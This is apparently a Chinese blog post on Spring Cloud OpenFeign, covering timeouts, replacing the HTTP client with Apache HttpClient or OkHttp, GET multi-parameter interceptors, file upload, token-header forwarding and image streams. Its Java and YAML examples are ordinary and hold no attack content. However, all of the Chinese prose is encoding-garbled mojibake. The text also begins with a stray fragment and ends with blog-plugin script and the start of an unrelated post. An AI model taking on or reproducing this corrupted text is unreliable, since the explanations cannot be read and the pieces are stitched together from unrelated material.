HTTP (0-byte body) Feign çš„è¶…æ—¶è®¾ç½®Feign çš„è°ƒç”¨åˆ†ä¸ºä¸¤å±‚ï¼Œå³ Ribbon çš„è°ƒç”¨å’Œ Hystrix çš„è°ƒç”¨ï¼›å…¶ä¸­é«˜ç‰ˆæœ¬çš„ Feign é»˜è®¤å…³é—­äº† Hystrixï¼Œè€Œ Ribbon é»˜è®¤æ˜¯å¯ç”¨äº†ã€‚é¦–å…ˆæ ¹æ®è¶…æ—¶çš„å¼‚å¸¸æ—¥å¿—ä¿¡æ¯ï¼Œåˆ¤æ–­æ˜¯ Ribbon è¶…æ—¶ è¿˜æ˜¯ Hystrix è¶…æ—¶å¯¼è‡´äº†å¼‚å¸¸çš„å‘ç”Ÿï¼Œç„¶åæ ¹æ®åˆ¤æ–­ç»“æœæ·»åŠ  Ribbon æˆ–è€… Hystrix çš„è¶…æ—¶é…ç½®ä¿¡æ¯å³å¯ã€‚ä¾‹å¦‚ï¼šä¸‹è¿°é…ç½®å†…å®¹æ˜¯é’ˆå¯¹ provider æœåŠ¡æ·»åŠ ä¸ Ribbon è¶…æ—¶ç›¸å…³çš„é…ç½®å‚æ•°ï¼š 1234PROVIDER: ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 Feign ä½¿ç”¨æ³¨æ„äº‹é¡¹ åœ¨ Feign Client æ¥å£ä¸­ï¼Œä¸æ”¯æŒ GET æ–¹æ³•ç›´æ¥ç»‘å®š POJO ç­‰å¤æ‚å¯¹è±¡ åœ¨ Feign Client æ¥å£ä¸­ï¼Œå¦‚æœä½¿ç”¨åˆ° @PathVariableï¼Œå¿…é¡»æŒ‡å®šå…¶ value åœ¨ Feign Client æ¥å£ä¸­ï¼Œä¸èƒ½ä½¿ç”¨ @GetMapping ä¹‹ç±»çš„ç»„åˆæ³¨è§£ï¼Œåªæ”¯æŒä½¿ç”¨ @RequestMapping è¿™ç±»åŸºç¡€æ³¨è§£ @FeignClient çš„å±æ€§ä¸­ï¼ŒserviceId å±æ€§å·²ç»å¤±æ•ˆï¼Œæ¨èä½¿ç”¨ name å±æ€§ @FeignClient çš„å±æ€§ä¸­ï¼Œåœ¨è€ç‰ˆæœ¬çš„ Spring Cloud ä½¿ç”¨ url å±æ€§æ—¶ï¼Œä¸éœ€è¦æä¾› name å±æ€§ï¼›ä½†åœ¨æ–°ç‰ˆæœ¬ä¸­é‡Œå¿…é¡»æä¾› name å±æ€§ï¼Œå¹¶ä¸” nameã€url å±æ€§æ”¯æŒå ä½ç¬¦ è‹¥éœ€è¦è‡ªå®šä¹‰å•ä¸ª Feign Client çš„é…ç½®ï¼Œæ­¤æ—¶è¢« @Configuration æ³¨è§£æ ‡æ³¨çš„ç±»ï¼Œä¸å…è®¸è¢« @ComponentScan æ³¨è§£æ‰«æåˆ°ï¼Œå¦åˆ™å°†ä¼šå¯¼è‡´æ‰€æœ‰çš„ Feign Client éƒ½ä¼šä½¿ç”¨è¯¥é…ç½® Spring Cloud OpenFeign å®æˆ˜åº”ç”¨Feign é»˜è®¤ Client çš„æ›¿æ¢Feign åœ¨é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨çš„æ˜¯ JDK åŸç”Ÿçš„ URLConnection å‘é€ HTTP è¯·æ±‚ï¼Œæ²¡æœ‰ä½¿ç”¨è¿æ¥æ± ï¼Œä½†æ˜¯å¯¹æ¯ä¸ªåœ°å€éƒ½ä¼šä¿æŒä¸€ä¸ªé•¿è¿æ¥ï¼Œå³åˆ©ç”¨ HTTP çš„ persistence connectionsã€‚å¼€å‘è€…å¯ä»¥ç”¨ Apache çš„ HTTP Client æ›¿æ¢ Feign åŸå§‹çš„ HTTP Clientï¼Œé€šè¿‡è®¾ç½®è¿æ¥æ± ã€è¶…æ—¶æ—¶é—´ç­‰å¯¹æœåŠ¡ä¹‹é—´çš„è°ƒç”¨è¿›è¡Œè°ƒä¼˜ã€‚é€šè¿‡æŸ¥çœ‹æºç ï¼Œåœ¨ç±» feign.Client.Default ä¸­å¯ä»¥çœ‹åˆ°ä»¥ä¸‹ä»£ç ï¼Œé»˜è®¤æ‰§è¡Œ HTTP è¯·æ±‚çš„å°±æ˜¯ URLConnectionã€‚è€Œåœ¨ç±» org.springframework.cloud.openfeign.ribbon.FeignRibbonClientAutoConfiguration ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å¼•å…¥äº†ä¸‰ä¸ªç±»ï¼šHttpClientFeignLoadBalancedConfigurationã€OkHttpFeignLoadBalancedConfigurationã€DefaultFeignLoadBalancedConfigurationï¼Œå…¶ä¸­å¯ä»¥çœ‹åˆ°åœ¨ DefaultFeignLoadBalancedConfiguration ä¸­ï¼Œä½¿ç”¨çš„æ˜¯ feign.Client.Defaultï¼Œå³ä½¿ç”¨äº† URLConnectionã€‚ 1234567public static class Default implements Client { public Response execute(Request request, Options options) throws IOException { HttpURLConnection connection = this.convertAndSend(request, options); return this.convertResponse(connection).toBuilder().request(request).build(); }} 12345678class DefaultFeignLoadBalancedConfiguration { @Bean @ConditionalOnMissingBean public Client feignClient(CachingSpringLoadBalancerFactory cachingFactory, SpringClientFactory clientFactory) { return new LoadBalancerFeignClient(new Default((SSLSocketFactory)null, (HostnameVerifier)null), cachingFactory, clientFactory); }} ä½¿ç”¨ HTTP Client æ›¿æ¢ä½¿ç”¨ Apache HTTP Client æ›¿æ¢ Feign é»˜è®¤çš„ Clientï¼Œæ›¿æ¢æ­¥éª¤éå¸¸ç®€å•ï¼Œåªéœ€è¦åœ¨ pom.xml ä¸ application.yml åˆ†åˆ«æ·»åŠ ä»¥ä¸‹é…ç½®å†…å®¹å³å¯ï¼š 123456789101112&lt;!-- å¼•å…¥ HTTP Client --&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- å¼•å…¥ Feign å¯¹ Http Client çš„æ”¯æŒ --&gt;&lt;dependency&gt; &lt;groupId&gt;com.netflix.feign&lt;/groupId&gt; &lt;artifactId&gt;feign-httpclient&lt;/artifactId&gt; &lt;version&gt;8.17.0&lt;/version&gt;&lt;/dependency&gt; 123feign: httpclient: enabled: true éªŒè¯é»˜è®¤ Client çš„æ›¿æ¢ï¼Œåœ¨ç±» HttpClientFeignLoadBalancedConfiguration ä¸Šï¼Œå£°æ˜äº†æ³¨è§£ @ConditionalOnClass(ApacheHttpClient.class)ã€@ConditionalOnProperty(value = "feign.httpclient.enabled", matchIfMissing = true)ï¼Œå³åªæœ‰åœ¨ ApacheHttpClient ç±»å­˜åœ¨ä¸” feign.httpclient.enabled ä¸º true æ—¶æ‰ä¼šå¯ç”¨é…ç½®ã€‚æ­¤æ—¶å¯ä»¥åœ¨ HttpClientFeignLoadBalancedConfiguration.feignClient() æ–¹æ³•é‡Œæ‰“ä¸Šæ–­ç‚¹ï¼ˆçº¦ç¬¬ 43 è¡Œï¼‰ï¼Œé‡æ–°å¯åŠ¨é¡¹ç›®ï¼Œå¯ä»¥çœ‹åˆ°ç¡®å®è¿›è¡Œäº† ApacheHttpClient çš„å£°æ˜ï¼›å†å°† feign.httpclient.enabled è®¾ç½®ä¸º false åï¼Œæ–­ç‚¹å°±è¿›ä¸æ¥äº†ï¼Œç”±æ­¤å¯ä»¥éªŒè¯ ApacheHttpClient æ›¿æ¢æˆåŠŸã€‚ ä½¿ç”¨ Okhttp æ›¿æ¢ä½¿ç”¨ Okhttp æ›¿æ¢ Feign é»˜è®¤çš„ Clientï¼ŒåŒæ ·åªéœ€è¦åœ¨ pom.xml ä¸ application.yml åˆ†åˆ«æ·»åŠ ä»¥ä¸‹é…ç½®å†…å®¹ï¼›éªŒè¯æ˜¯å¦æ›¿æ¢æˆåŠŸï¼Œå…·ä½“å¯ä»¥å‚è€ƒä¸Šè¿°éªŒè¯æ­¥éª¤ï¼Œåœ¨ OkHttpFeignLoadBalancedConfiguration.feignClient() æ–¹æ³•é‡Œæ‰“æ–­ç‚¹è°ƒè¯•ã€‚ 12345&lt;!-- å¼•å…¥ Feign å¯¹ Okhttp çš„æ”¯æŒ --&gt;&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign&lt;/groupId&gt; &lt;artifactId&gt;feign-okhttp&lt;/artifactId&gt;&lt;/dependency&gt; 123feign: okhttp: enabled: true è‹¥éœ€è¦å¯¹ Okhttp è¿›è¡Œä¸ªæ€§åŒ–çš„å‚æ•°è®¾ç½®ï¼Œå¯å‚è€ƒä»¥ä¸‹ä»£ç ï¼Œå…¶ä¸­ Okhttp çš„ç‰¹æ€§æœ‰ï¼š æ”¯æŒ SPDYï¼Œå¯ä»¥åˆå¹¶å¤šä¸ªåˆ°åŒä¸€ä¸ªä¸»æœºçš„è¯·æ±‚ ä½¿ç”¨è¿æ¥æ± æŠ€æœ¯å‡å°‘è¯·æ±‚çš„å»¶è¿Ÿï¼ˆå¦‚æœ SPDY æ˜¯å¯ç”¨çš„è¯ï¼‰ ä½¿ç”¨ GZIP å‹ç¼©å‡å°‘ä¼ è¾“çš„æ•°æ®é‡ ç¼“å­˜å“åº”ç»“æœï¼Œé¿å…é‡å¤çš„ç½‘ç»œè¯·æ±‚ 1234567891011121314151617181920@Configuration@ConditionalOnClass(Feign.class)@AutoConfigureBefore(FeignAutoConfiguration.class)public class FeignOkHttpConfig { @Bean public okhttp3.OkHttpClient okHttpClient(){ return new okhttp3.OkHttpClient.Builder() //è®¾ç½®è¿æ¥è¶…æ—¶ .connectTimeout(60, TimeUnit.SECONDS) //è®¾ç½®è¯»è¶…æ—¶ .readTimeout(60, TimeUnit.SECONDS) //è®¾ç½®å†™è¶…æ—¶ .writeTimeout(60,TimeUnit.SECONDS) //æ˜¯å¦è‡ªåŠ¨é‡è¿ .retryOnConnectionFailure(true) .connectionPool(new ConnectionPool()) //æ„å»ºOkHttpClientå¯¹è±¡ .build(); }} Post å’Œ Get çš„å¤šå‚æ•°ä¼ é€’å¤šå‚æ•°ä¼ é€’æ–¹æ¡ˆä»‹ç»åœ¨ä¼ä¸šé¡¹ç›®çš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨ Feign å®ç°æœåŠ¡ä¸æœåŠ¡ä¹‹é—´çš„è°ƒç”¨æ—¶ï¼Œæ— æ³•é¿å…å¤šå‚æ•°çš„ä¼ é€’ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨ Web å¼€å‘ä¸­ Spring MVC æ˜¯æ”¯æŒ GET æ–¹æ³•ç›´æ¥ç»‘å®š POJO çš„ï¼Œä½†æ˜¯ Feign çš„å®ç°å¹¶æœªè¦†ç›–æ‰€æœ‰ Spring MVC çš„åŠŸèƒ½ï¼Œç›®å‰è§£å†³æ–¹å¼å¾ˆå¤šï¼Œæœ€å¸¸è§çš„è§£å†³æ–¹å¼å¦‚ä¸‹ï¼š å°†æ–¹æ³•å‚æ•°å°è£…æˆ Map ä¼ é€’ é€šè¿‡ Feign æ‹¦æˆªå™¨çš„æ–¹å¼å¤„ç†ï¼ˆæ¨èï¼‰ å°† POJO æ‹†æ•£ä¸€ä¸ªä¸ªå•ç‹¬çš„å±æ€§æ”¾åœ¨æ–¹æ³•å‚æ•°é‡Œ ä½¿ç”¨ GET ä¼ é€’ @RequestBodyï¼Œä½†æ­¤æ–¹å¼è¿åäº† Restful è§„èŒƒ å¤šå‚æ•°ä¼ é€’çš„ç¤ºä¾‹ä»£ç è¿™é‡Œä¸»è¦ä»‹ç»é€šè¿‡ Feign æ‹¦æˆªå™¨å¤„ç†çš„æ–¹å¼ï¼Œé€šè¿‡å®ç° Feign çš„ RequestInterceptor ä¸­çš„ aplly æ–¹æ³•ï¼Œæ¥è¿›è¡Œç»Ÿä¸€æ‹¦æˆªè½¬æ¢å¤„ç† Feign ä¸­çš„ GET æ–¹æ³•å¤šå‚æ•°ä¼ é€’çš„é—®é¢˜ã€‚ç”±äºç¯‡å¹…æœ‰é™ï¼Œä¸‹é¢åªè´´å‡ºæ ¸å¿ƒä»£ç ï¼Œå®Œæ•´çš„ç¤ºä¾‹ä»£ç å¯ä»¥ç‚¹å‡»è¿™é‡Œä¸‹è½½ã€‚ ä¸ºäº†æ–¹ä¾¿æµ‹è¯•æœåŠ¡ä¹‹é—´çš„æ¥å£è°ƒç”¨ï¼Œåœ¨ Consumer ç«¯ï¼ˆæœåŠ¡æ¶ˆè´¹è€…ï¼‰æ•´åˆ Swagger2ï¼Œ pom.xml åŠ å…¥ä»¥ä¸‹é…ç½®ï¼š 1234567891011&lt;!-- Swagger2 --&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt; åœ¨ Consumer ç«¯ï¼ˆæœåŠ¡æ¶ˆè´¹è€…ï¼‰ç¼–å†™ Feign æ‹¦æˆªå™¨ä»£ç ï¼Œç”±äº Feign ä¸æ”¯æŒ GET æ–¹æ³•ä¼  POJOï¼Œå› æ­¤æ‰‹åŠ¨å°† Json Body è½¬æ¢ä¸º Queryï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455@Componentpublic class FeignRequestInterceptor implements RequestInterceptor { @Autowired private ObjectMapper objectMapper; @Override public void apply(RequestTemplate template) { // Feign ä¸æ”¯æŒ GET æ–¹æ³•ä¼  POJO, å°† Json Body è½¬æ¢ä¸º Query if (template.method().equals("GET") &amp;&amp; template.body() != null) { try { JsonNode jsonNode = objectMapper.readTree(template.body()); template.body(null); Map&lt;String, Collection&lt;String&gt;&gt; queries = new HashMap&lt;&gt;(); buildQuery(jsonNode, "", queries); template.queries(queries); } catch (IOException e) { // æ ¹æ®å®è·µé¡¹ç›®æƒ…å†µå¤„ç†æ­¤å¤„å¼‚å¸¸ e.printStackTrace(); } } } private void buildQuery(JsonNode jsonNode, String path, Map&lt;String, Collection&lt;String&gt;&gt; queries) { if (!jsonNode.isContainerNode()) { // å¶å­èŠ‚ç‚¹ if (jsonNode.isNull()) { return; } Collection&lt;String&gt; values = queries.get(path); if (null == values) { values = new ArrayList&lt;&gt;(); queries.put(path, values); } values.add(jsonNode.asText()); return; } if (jsonNode.isArray()) { // æ•°ç»„èŠ‚ç‚¹ Iterator&lt;JsonNode&gt; it = jsonNode.elements(); while (it.hasNext()) { buildQuery(it.next(), path, queries); } } else { Iterator&lt;Map.Entry&lt;String, JsonNode&gt;&gt; it = jsonNode.fields(); while (it.hasNext()) { Map.Entry&lt;String, JsonNode&gt; entry = it.next(); if (StringUtils.hasText(path)) { buildQuery(entry.getValue(), path + "." + entry.getKey(), queries); } else { // æ ¹èŠ‚ç‚¹ buildQuery(entry.getValue(), entry.getKey(), queries); } } } }} ç¼–å†™ Consumer ç«¯ï¼ˆæœåŠ¡æ¶ˆè´¹è€…ï¼‰çš„ Feign Client æ¥å£ç±»ï¼š 1234567891011121314@FeignClient(name = "PROVIDER")public interface UserFeignService { /** * é»˜è®¤æƒ…å†µä¸‹ï¼ŒFeign ä¸æ”¯æŒ GET æ–¹æ³•ä¼  POJO * @param user * @return */ @RequestMapping(value = "/user/add", method = RequestMethod.GET) String addUser(User user); @RequestMapping(value = "/user/update", method = RequestMethod.POST) String updateUser(@RequestBody User user);} ä½¿ç”¨ Swagger2ï¼Œå¹¶ç¼–å†™ Consumer ç«¯ï¼ˆæœåŠ¡æ¶ˆè´¹è€…ï¼‰çš„ Controller ç±»ï¼Œç”¨äºè°ƒç”¨ Feign Client è¿›è¡Œ GET æˆ–è€… POST å¤šå‚æ•°ä¼ é€’ 123456789101112131415161718192021222324252627282930@RestController@Api("ç”¨æˆ·ç®¡ç†ç›¸å…³æ¥å£")@RequestMapping("/user")public class UserController { @Autowired private UserFeignService userFeignService; /** * ç”¨äºæ¼”ç¤ºFeignçš„Getè¯·æ±‚å¤šå‚æ•°ä¼ é€’ * @param user * @return */ @ApiOperation("æ·»åŠ ç”¨æˆ·çš„æ¥å£") @RequestMapping(value = "/add", method = RequestMethod.GET) public String addUser(@ApiParam(name="ç”¨æˆ·",required=true) User user){ return userFeignService.addUser(user); } /** * ç”¨äºæ¼”ç¤ºFeignçš„Postè¯·æ±‚å¤šå‚æ•°ä¼ é€’ * @param user * @return */ @ApiOperation("æ›´æ”¹ç”¨æˆ·çš„æ¥å£") @RequestMapping(value = "/update", method = RequestMethod.POST) public String updateUser( @RequestBody @ApiParam(name="ç”¨æˆ·",value="ä¼ å…¥jsonæ ¼å¼",required=true) User user){ return userFeignService.updateUser(user); }} ç¼–å†™ Provider ç«¯ï¼ˆæœåŠ¡æä¾›è€…ï¼‰çš„ Controller ç±»ï¼Œç”¨äºæ¥æ”¶ Feign Client çš„ GET è¯·æ±‚ä¼ é€’è¿‡æ¥çš„ User å¯¹è±¡ï¼š 12345678910111213141516@RestController@RequestMapping("/user")public class UserController { @RequestMapping(value = "/add", method = RequestMethod.GET) public User addUser(User user) { System.out.println("==&gt; add: " + user.getId() + \'-\' + user.getName() + "-" + user.getAge()); return user; } @RequestMapping(value = "/update", method = RequestMethod.POST) public User updateUser(@RequestBody User user) { System.out.println("==&gt; update: " + user.getId() + \'-\' + user.getName() + "-" + user.getAge()); return user; }} åˆ†åˆ«å¯åŠ¨å„ä¸ªåº”ç”¨åï¼Œæµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/swagger-ui.htmlï¼Œé€šè¿‡ Swagger2 æä¾›çš„ UI ç•Œé¢æµ‹è¯•å¯¹åº”çš„æ¥å£å³å¯ã€‚ Feign å¤„ç†æ–‡ä»¶ä¸Šä¼ Netflix å¼€å‘çš„ Feign æ—©å…ˆä¸æ”¯æŒæ–‡ä»¶ä¸Šä¼ ï¼Œåæ¥è™½æ”¯æŒä½†ä»æœ‰ç¼ºé™·ï¼Œéœ€è¦ä¸€æ¬¡æ€§å®Œæ•´åœ°å°†æ–‡ä»¶è¯»åˆ°å†…å­˜å†ç¼–ç å‘é€ã€‚åœ¨æ—©æœŸçš„ Spring Cloud ä¸­ï¼ŒFeign æœ¬èº«æ˜¯æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„ï¼Œè¦æƒ³å®ç°æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œéœ€è¦è‡ªè¡Œç¼–å†™ Encoder å»å®ç°æ–‡ä»¶ä¸Šä¼ ã€‚åæ¥ Netflix å®˜æ–¹æä¾›äº†å­é¡¹ç›® feign-formï¼Œå…¶ä¸­å®ç°äº†æ–‡ä»¶ä¸Šä¼ æ‰€éœ€çš„ Encoderã€‚ç”±äºç¯‡å¹…æœ‰é™ï¼Œä¸‹é¢åªè´´å‡ºæ ¸å¿ƒä»£ç ï¼Œå®Œæ•´çš„ç¤ºä¾‹ä»£ç å¯ä»¥ç‚¹å‡»è¿™é‡Œä¸‹è½½ã€‚ åœ¨ Consumer ç«¯ï¼ˆæœåŠ¡æ¶ˆè´¹è€…ï¼‰çš„ pom.mxl æ–‡ä»¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 1234567891011&lt;!-- Feign æ–‡ä»¶ä¸Šä¼ --&gt;&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign.form&lt;/groupId&gt; &lt;artifactId&gt;feign-form&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign.form&lt;/groupId&gt; &lt;artifactId&gt;feign-form-spring&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt; åœ¨ Consumer ç«¯ï¼ˆæœåŠ¡æ¶ˆè´¹è€…ï¼‰ä¸­ï¼ŒæŒ‡å®š Feign Client å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„ç¼–ç å™¨ï¼Œç‰¹åˆ«æ³¨æ„ï¼šè¯¥é…ç½®ç±»ä¸èƒ½è¢« @ComponentScan æ³¨è§£æ‰«æåˆ°ï¼Œå¦åˆ™è¯¥é…ç½®å°†åº”ç”¨åˆ°æ‰€æœ‰ Feign Client 1234567891011/** * Feign Client é…ç½®ï¼ˆéå…¨å±€ç”Ÿæ•ˆï¼‰ */@Configurationpublic class FeignMultipartSupportConfig { @Bean public Encoder multipartFormEncoder() { return new SpringFormEncoder(); }} ç¼–å†™ Consumer ç«¯ï¼ˆæœåŠ¡æä¾›è€…ï¼‰çš„ Feign æ–‡ä»¶ä¸Šä¼ çš„å®¢æˆ·ç«¯ï¼š 12345678910111213@FeignClient(name = "PROVIDER", configuration = FeignMultipartSupportConfig.class)public interface FileUploadFeignService { /*** * produces, consumeså¿…å¡« * @param file * @return */ @RequestMapping(value = "/uploadFile", method = RequestMethod.POST, produces = {MediaType.APPLICATION_JSON_UTF8_VALUE}, consumes = MediaType.MULTIPART_FORM_DATA_VALUE) String fileUpload(@RequestPart(value = "file") MultipartFile file);} ä½¿ç”¨ Swagger2ï¼Œå¹¶ç¼–å†™ Consumer ç«¯ï¼ˆæœåŠ¡æä¾›è€…ï¼‰çš„ Controller ç±»ï¼Œç”¨äºä¸Šä¼ æ–‡ä»¶ï¼š 1234567891011121314@RestController@Api(value = "æ–‡ä»¶ä¸Šä¼ æ¥å£")@RequestMapping("/feign")public class FeignUploadController { @Autowired private FileUploadFeignService fileUploadFeignService; @ApiOperation(value = "æ–‡ä»¶ä¸Šä¼ ", notes = "è¯·é€‰æ‹©æ–‡ä»¶ä¸Šä¼ ") @PostMapping(value = "/upload", consumes = MediaType.MULTIPART_FORM_DATA_VALUE) public String imageUpload(@RequestPart(value = "file") @ApiParam(value = "æ–‡ä»¶ä¸Šä¼ ", required = true) MultipartFile file) throws Exception { return fileUploadFeignService.fileUpload(file); }} ç¼–å†™ Provider ç«¯ï¼ˆæœåŠ¡æä¾›è€…ï¼‰çš„ Controller ç±»ï¼Œç”¨äºæ¥æ”¶ Feign Client ä¸Šä¼ çš„æ–‡ä»¶: 12345678@RestControllerpublic class FeignUploadController { @PostMapping(value = "/uploadFile", consumes = MediaType.MULTIPART_FORM_DATA_VALUE) public String fileUploadServer(@RequestPart(value = "file") MultipartFile file) throws Exception { return "file-name: " + file.getOriginalFilename() + " file-size: " + file.getSize(); }} åˆ†åˆ«å¯åŠ¨å„ä¸ªåº”ç”¨åï¼Œæµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/swagger-ui.htmlï¼Œé€šè¿‡ Swagger2 æä¾›çš„ UI ç•Œé¢ä¸Šä¼ æ–‡ä»¶å³å¯ã€‚ Feign å¤„ç†é¦–æ¬¡è¯·æ±‚å¤±è´¥å½“ Feign å’Œ Ribbon æ•´åˆäº† Hystrix ä¹‹åï¼Œå¯èƒ½ä¼šå‡ºç°é¦–æ¬¡è°ƒç”¨å¤±è´¥çš„é—®é¢˜ã€‚åŸå› æ˜¯ Hystrix é»˜è®¤çš„è¶…æ—¶æ—¶é—´æ˜¯ 1 ç§’ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´å°šæœªä½œå‡ºå“åº”ï¼Œå°†ä¼šè¿›å…¥ fallback ä»£ç ã€‚ç”±äº Bean çš„è£…é…ä»¥åŠæ‡’åŠ è½½æœºåˆ¶ç­‰ï¼ŒFeign é¦–æ¬¡è¯·æ±‚éƒ½ä¼šæ¯”è¾ƒæ…¢ï¼Œå¦‚æœè¿™ä¸ªå“åº”æ—¶é—´è¶…è¿‡ 1 ç§’ï¼Œå°±ä¼šå‡ºç°è¯·æ±‚å¤±è´¥çš„é—®é¢˜ã€‚æ­¤æ—¶å¯ä»¥é‡‡å–ä»¥ä¸‹ä¸‰ç§æ–¹æ³•å¤„ç†ï¼š ä½¿ç”¨ Feign çš„æ—¶å€™ç›´æ¥å…³é—­ Hystrixï¼ˆä¸æ¨èï¼‰ï¼š feign.hystrix.enabled=false ç¦ç”¨ Hystrix çš„è¶…æ—¶æ—¶é—´ï¼š hystrix.command.default.execution.timeout.enabled=false å°† Hystrix çš„è¶…æ—¶æ—¶é—´æ”¹ä¸º 5 ç§’ï¼š hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds=5000 Feign è°ƒç”¨ä¼ é€’ Tokenåœ¨è¿›è¡Œè®¤è¯é‰´æƒçš„æ—¶å€™ï¼Œä¸ç®¡æ˜¯ JWT è¿˜æ˜¯ Spring Securityï¼Œå½“ä½¿ç”¨ Feign æ—¶å°±ä¼šå‘ç°å¤–éƒ¨è¯·æ±‚åˆ° A æœåŠ¡çš„æ—¶å€™ï¼ŒA æœåŠ¡æ˜¯å¯ä»¥æ‹¿åˆ° Token çš„ï¼›ç„¶è€Œå½“ A æœåŠ¡ä½¿ç”¨ Feign è°ƒç”¨ B æœåŠ¡æ—¶ï¼ŒToken å°±ä¼šä¸¢å¤±ï¼Œä»è€Œå¯¼è‡´è®¤è¯å¤±è´¥ã€‚è§£å†³æ–¹æ³•æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥åˆ©ç”¨ RequestInterceptor æ‹¦æˆªå™¨ï¼Œåœ¨ Feign è°ƒç”¨çš„æ—¶å€™ï¼Œå‘è¯·æ±‚å¤´é‡Œé¢æ·»åŠ éœ€è¦ä¼ é€’çš„ Tokenï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940/** * Feignç»Ÿä¸€Tokenæ‹¦æˆªå™¨ */@Componentpublic class FeignTokenInterceptor implements RequestInterceptor { @Override public void apply(RequestTemplate requestTemplate) { if(null==getHttpServletRequest()){ //æ­¤å¤„çœç•¥æ—¥å¿—è®°å½• return; } //å°†è·å–Tokenå¯¹åº”çš„å€¼å¾€ä¸‹é¢ä¼  requestTemplate.header("oauthToken", getHeaders(getHttpServletRequest()).get("oauthToken")); } private HttpServletRequest getHttpServletRequest() { try { return ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest(); } catch (Exception e) { return null; } } /** * Feignæ‹¦æˆªå™¨æ‹¦æˆªè¯·æ±‚è·å–Tokenå¯¹åº”çš„å€¼ * @param request * @return */ private Map&lt;String, String&gt; getHeaders(HttpServletRequest request) { Map&lt;String, String&gt; map = new LinkedHashMap&lt;&gt;(); Enumeration&lt;String&gt; enumeration = request.getHeaderNames(); while (enumeration.hasMoreElements()) { String key = enumeration.nextElement(); String value = request.getHeader(key); map.put(key, value); } return map; }} Feign è¿”å›å›¾ç‰‡æµåœ¨ä½¿ç”¨ Feign çš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥å°†å›¾ç‰‡æµè½¬æ¢æˆå­—èŠ‚æ•°ç»„æ¥ä¼ é€’ï¼Œä½†æ˜¯å› ä¸º Controller å±‚ä¸èƒ½ç›´æ¥è¿”å› byteï¼Œå› æ­¤éœ€è¦å°† Feign çš„è¿”å›å€¼ä¿®æ”¹ä¸º feign.Response 12@RequestMapping(value = "/createImageCode")public Response createImageCode(@RequestParam("imageKey") String imageKey); venus-cloud-feign çš„ä½¿ç”¨ä¸ºäº†æ–¹ä¾¿åœ¨ API ä¸­ä½¿ç”¨ Feign æ›¿ä»£ RestTemplate çš„æ‰‹åŠ¨è°ƒç”¨ï¼Œåœ¨å†™ Feign æ¥å£çš„æ—¶å€™ï¼Œæƒ³ç”¨ Spring MVC æ³¨è§£åªåœ¨ Feign æ¥å£å†™ä¸€éï¼Œç„¶åå®ç°ç±»å®ç°æ­¤æ¥å£å³å¯ã€‚ä½†æ˜¯ Spring MVC ä¸æ”¯æŒå®ç°æ¥å£é‡Œçš„æ–¹æ³•å‚æ•°ä¸Šçš„æ³¨è§£ï¼ˆæ”¯æŒç»§æ‰¿ç±»ã€æ–¹æ³•ä¸Šçš„æ³¨è§£ï¼‰ï¼Œè€Œä¸”åœ¨ GET è¯·æ±‚å¤šå‚æ•°ä¼ é€’çš„é—®é¢˜ä¸Šï¼Œéœ€è¦é€šè¿‡æ‹¦æˆªå™¨çš„æ–¹å¼è§£å†³ã€‚ä¸ºäº†è§£å†³ä¸Šè¿°ä¸¤ä¸ªé—®é¢˜ï¼ŒSpring Cloud ä¸­å›½ç¤¾åŒºå¯¹ Spring Cloud Feign è¿›è¡Œäº†å¢å¼ºï¼Œé¡¹ç›®åä¸º venus-cloud-feignï¼Œç›®å‰åªæ”¯æŒ Spring Cloud çš„ Finchley ç‰ˆæœ¬ï¼Œæ›´å¤šä½¿ç”¨æ–¹å¼å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"æ•°æ®ç»“æ„ - ç®—æ³•é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/a0733161.html",text:'ç®—æ³•é€’å½’é€’å½’çš„ä¸‰å¤§è¦ç´ 